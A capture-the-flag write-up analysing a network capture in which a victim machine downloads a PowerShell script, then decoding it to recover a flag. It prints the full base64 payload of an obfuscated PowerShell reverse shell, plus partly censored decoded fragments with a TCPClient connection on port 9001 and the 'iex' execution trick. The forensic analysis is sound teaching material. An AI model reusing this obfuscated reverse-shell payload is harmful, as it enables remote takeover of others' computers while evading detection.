# Nishang

## Challenge Description

> Category: Beginner\
> Analyze the provided network capture to uncover what was downloaded to the victim’s machine.

In this challenge, we are given access to a pcap file and it is hinted that something was downloaded to a "victim's" machine. As a heads up, in this challenge there is an inclusion of a Powershell reverse shell which does get picked up by Windows Security. To keep Windows from complaining I've censored out significant portions of the snippet.

## Solution

Opening the capture file in Wireshark, we see it is relatively small with only 17 packets. Immediately, what stands out the most are 2 HTTP packets: a GET request and a 200 OK replying to that GET request. If we follow the HTTP Stream we get the following.

```
GET /udujreghjs.ps1 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3803
Host: 192.168.75.130:8000
Connection: Keep-Alive


HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.10.12
Date: Sat, 26 Jul 2025 10:23:38 GMT
Content-type: application/octet-stream
Content-Length: 4164
Last-Modified: Sat, 26 Jul 2025 10:18:20 GMT

KAAoACgAIgB7ADQANwB9AHsAOQAwAH0AewAxADYAfQB7ADkANAB9AHsAMwAwAH0AewA4ADQAfQB7ADUAMgB9AHsAMQAxADEAfQB7ADUAOAB9AHsANQA2AH0AewAzADMAfQB7ADEAMAA2AH0AewAxADAAMQB9AHsAMgAzAH0AewAxADEAfQB7ADcAMwB9AHsAOQAyAH0AewAxADQAfQB7ADgANgB9AHsANAA5AH0AewAxADEANQB9AHsAMQAxADMAfQB7ADgAMAB9AHsANwAwAH0AewAyADIAfQB7ADkAOAB9AHsANAAwAH0AewAxADAAfQB7ADYAfQB7ADYANwB9AHsANQB9AHsANgA5AH0AewAyADUAfQB7ADQANAB9AHsANwAxAH0AewA0ADUAfQB7ADYAMQB9AHsANQA3AH0AewA5ADcAfQB7ADkAOQB9AHsAMQAwADQAfQB7ADEAMQAwAH0AewAxADEANwB9AHsAMQAwADkAfQB7ADEAMAA1AH0AewA5ADEAfQB7ADUAMwB9AHsANQAxAH0AewAzADQAfQB7ADEAMAAwAH0AewAyADYAfQB7ADIAMQB9AHsAMQAzAH0AewAxADEANgB9AHsAMwA5AH0AewAyADQAfQB7ADEAMAAzAH0AewA3ADgAfQB7ADMANwB9AHsANwAyAH0AewAyAH0AewA3AH0AewA4ADUAfQB7ADgAfQB7ADgAMgB9AHsANQA1AH0AewA2ADgAfQB7ADcANQB9AHsAOAA5AH0AewAxADIAfQB7ADYANAB9AHsANAAzAH0AewA0AH0AewAzAH0AewAzADUAfQB7ADcANwB9AHsAMwA4AH0AewAzADIAfQB7ADYAMwB9AHsAOQAzAH0AewAyADgAfQB7ADEANwB9AHsAOQA2AH0AewA3ADkAfQB7ADYANgB9AHsAMwA2AH0AewAyADkAfQB7ADgANwB9AHsAMQAwADcAfQB7ADEAMAA4AH0AewA4ADMAfQB7ADQAOAB9AHsANQA0AH0AewAxAH0AewAwAH0AewAxADEAMgB9AHsAOQB9AHsAMQAwADIAfQB7ADEANQB9AHsAMwAxAH0AewAxADgAfQB7ADgAMQB9AHsANQAwAH0AewA4ADgAfQB7ADIAMAB9AHsANwA2AH0AewA1ADkAfQB7ADYANQB9AHsANwA0AH0AewA2ADAAfQB7ADYAMgB9AHsANAAxAH0AewA0ADYAfQB7ADEAMQA0AH0AewA5ADUAfQB7ADIANwB9AHsAMQA5AH0AewA0ADIAfQAiAC0AZgAnAC4AJwAsACcAdAAnACwAJwBuACcALAAnACkAJwAsACcAaQBuAGcAIAAnACwAJwB9ADsAdwBoAGkAbABlACgAKABuACcALAAnADQAJwAsACcAegAwAHMAZQBuAGQAYgBhAGMAawAgACcALAAnACAAKABpACcALAAnAF0AOgA6AEEAUwBDAEkASQApACcALAAnAEwANgAnACwAJwAwAG4AfQAxACcALAAnADIAPgAmADEAIABMADYAJwAsACcAZABpAG4AZwAnACwAJwAgAG4AegAwAGMAbABpAGUAJwAsACcAZQB0AEIAeQB0AGUAcwAoAG4AegAwAHMAZQBuAGQAYgAnACwAJwAgAD0AIABOAGUAJwAsACcAZQBuAGQAYgBhAGMAawAnACwAJwApADsAbgAnACwAJwBsAG8AcwBlACgAJwAsACcAcgBpAHQAZQAnACwAJwBBAFMAQwBJAEkARQBuAGMAbwAnACwAJwA9ACAAMAAuACcALAAnADEAJwAsACcAZQBzACwAJwAsACcAMABpACAAPQAgAG4AegAwAHMAdAByACcALAAnAC4AJwAsACcAbgB0AC4AQwAnACwAJwBzACcALAAnAHAAdwBkACkAJwAsACcATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuACcALAAnAGEAYwBrADIAJwAsACcAYgAnACwAJwBtADMAXwAnACwAJwBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAJwAsACcAOwBuAHoAMAAnACwAJwAoACcALAAnACkAJwAsACcAbgBkACcALAAnAEcAZQB0AFMAdAByAGkAbgBnACgAbgB6ADAAYgB5AHQAJwAsACcANQAnACwAJwBsAHUAcwBoACgAKQAnACwAJwApAA0ACgAnACwAJwAgAE8AdQB0AC0AUwB0AHIAJwAsACcAZQBhAG0ALgBSAGUAYQBkACcALAAnAG4AegAwAGIAJwAsACcAfQA7AG4AegAwACcALAAnAG4AegAnACwAJwB5AHQAZQAgAD0AIAAnACwAJwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAJwAsACcAMABzACcALAAnAHkAJwAsACcAUwBvACcALAAnAGUAYwB0ACAALQBUACcALAAnACgAWwB0AGUAeAAnACwAJwAgAG4AegAnACwAJwB3AHcAZgB7AHMAMAAnACwAJwB6ADAAYgAnACwAJwB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoADEAOQBSACcALAAnAGIAeQB0AGUALAAwACcALAAnAGUAbgBnAHQAaAApADsAbgB6ADAAcwB0AHIAJwAsACcAeQB0AGUAcwAsACAAMAAsACAAbgAnACwAJwBlAGEAbQAuAEYAJwAsACcAYQBjACcALAAnADQAJwAsACcALABuAHoAMABzAGUAbgBkAGIAeQB0AGUALgAnACwAJwBTACAAMQA5AFIAIAArACAAJwAsACcAJQB7ADAAJwAsACcAMABkACcALAAnAHoAJwAsACcAdABlAHMAIAAnACwAJwAoACcALAAnADsAJwAsACcAOQBSACwAOQAwADAAMQApADsAbgAnACwAJwBMACcALAAnAGEAJwAsACcAKABuAHoAMABzAGUAbgBkACcALAAnAHMAZQAnACwAJwAwAGkAJwAsACcAIAAxADkAUgBQACcALAAnAG4AegAwAGIAeQAnACwAJwB6ACcALAAnAGUAeAAnACwAJwA5AFIAOwBuAHoAMABzAGUAbgBkAGIAJwAsACcATgBlAHQALgAnACwAJwA9ACcALAAnAG4AdAAnACwAJwAuAFAAYQB0AGgAIAAnACwAJwB0AHIAZQBhAG0ALgBXACcALAAnAHQAYQAgACcALAAnADAAYwBsAGkAZQBuAHQAJwAsACcAYgBqACcALAAnAHoAMABzAHQAcgBlAGEAbQAgAD0AJwAsACcAawAyACAAIAA9ACAAbgB6ADAAJwAsACcAdwAtACcALAAnAGkAZQAnACwAJwAgACsAJwAsACcAeQAnACwAJwAuADYANQA1ADMAJwAsACcAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAbgB6ADAAJwAsACcAdAAnACwAJwBsAF8AMABiAGYAdQBzAGMANAA3ACcALAAnAC4ARwAnACwAJwAwACwAIABuAHoAJwAsACcAZABhAHQAJwAsACcATwAnACwAJwBwADAAdwAzAHIANQBoADMAbAAnACwAJwArACAAMQA5AFIAJwAsACcAPgAgADEAJwAsACcATgBlAHcALQAnACwAJwBhACAAPQAgACcALAAnAGMAawBlACcALAAnAGUAbgBjAG8AZABpAG4AZwAnACwAJwBbAF0AXQAnACwAJwBjAGwAJwAsACcAZQAnACwAJwApAC4AJwAsACcAKAAnACkAKQAtAHIAZQBQAEwAYQBjAGUAIAAgACcATAA2ADQAJwAsAFsAQwBoAGEAUgBdADEAMgA0AC0AQwByAGUAcABMAGEAQwBlACgAWwBDAGgAYQBSAF0ANAA5ACsAWwBDAGgAYQBSAF0ANQA3ACsAWwBDAGgAYQBSAF0AOAAyACkALABbAEMAaABhAFIAXQAzADkAIAAtAEMAcgBlAHAATABhAEMAZQAgACAAJwBuAHoAMAAnACwAWwBDAGgAYQBSAF0AMwA2ACkAfAAmACAAKAAoAGcAdgAgACcAKgBtAGQAUgAqACcAKQAuAG4AQQBtAEUAWwAzACwAMQAxACwAMgBdAC0AagBPAGkATgAnACcAKQA=
```

We see that the GET request is replyed with a payload of a bunch of random looking text. It's not hard to figure out that this is base64 encoding, which is very common in HTTP payloads, from the padding at the end and the characters used. We also get a bit of a hint from the GET request file path which is "udujreghjs.ps1". The ".ps1" file extension indicates that this is most likely a Powershell script. From here, we can decode it using a tool like Cyberchef. After doing so we get the output below. Also, I should point out the text is encoded using 16 bit characters, so you may have to change the settings in whatever tool you use to make it output correctly, or simply remove those erroneous NULL bytes.

```
((("{47}{90}{16}{94}{30}{84}{52}{111}{58}{56}{33}{106}{101}{23}{11}{73}{92}{14}{86}{49}{115}{113}{80}{70}{22}{98}{40}{10}{6}{67}{5}{69}{25}{44}{71}{45}{61}{57}{97}{99}{104}{110}{117}{109}{105}{91}{53}{51}{34}{100}{26}{21}{13}{116}{39}{24}{103}{78}{37}{72}{2}{7}{85}{8}{82}{55}{68}{75}{89}{12}{64}{43}
...
'0, nz','dat','O','p0w3r5h3l','+ 19R','> 1','New-','a = ','cke','encoding','[]]','cl','e',').','('))-rePLace  'L64',[ChaR]124-CrepLaCe([ChaR]49+[ChaR]57+[ChaR]82),[ChaR]39 -CrepLaCe  'nz0',[ChaR]36)|& ((gv '*mdR*').nAmE[3,11,2]-jOiN'')
```

Looking at this, we can identify that this is Powershell code, and that it is heavily obfuscated. If you try to run this command, you will get a bunch of errors most likely and Windows will swoop and complain about an attempted reverse shell. This isn't too suprising given the mention of a "victim" earlier. Still, we can sort of parse this command by looking at the parens that group it and see that the command is split into two parts:

```
((("{47}{90}{16}{94}{30}{84}{52}{111}{58}{56}{33}{106}{101}{23}{11}{73}{92}{14}{86}{49}{115}{113}{80}{70}{22}{98}{40}{10}{6}{67}{5}{69}{25}{44}{71}{45}{61}{57}{97}{99}{104}{110}{117}{109}{105}{91}{53}{51}{34}{100}{26}{21}{13}{116}{39}{24}{103}{78}{37}{72}{2}{7}{85}{8}{82}{55}{68}{75}{89}{12}{64}{43}
...
nz0','t','l_0bfusc47','.G','0, nz','dat','O','p0w3r5h3l','+ 19R','> 1','New-','a = ','cke','encoding','[]]','cl','e',').','('))-rePLace  'L64',[ChaR]124-CrepLaCe([ChaR]49+[ChaR]57+[ChaR]82),[ChaR]39 -CrepLaCe  'nz0',[ChaR]36)
```

Which gets piped with a '|&' into

```
((gv '*mdR*').nAmE[3,11,2]-jOiN'')
```

If we run just that first command, we get the flag in its output. The second piece is just a round about way of getting the string "iex" which is used to actually run the reverse shell.

```
$client = New-Object System.Net.Sockets.TCPClient('wwf{s0m3_p0w3r5h3ll_0bfusc4710n}',9001);
...
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Flag: `wwf{s0m3_p0w3r5h3ll_0bfusc4710n}`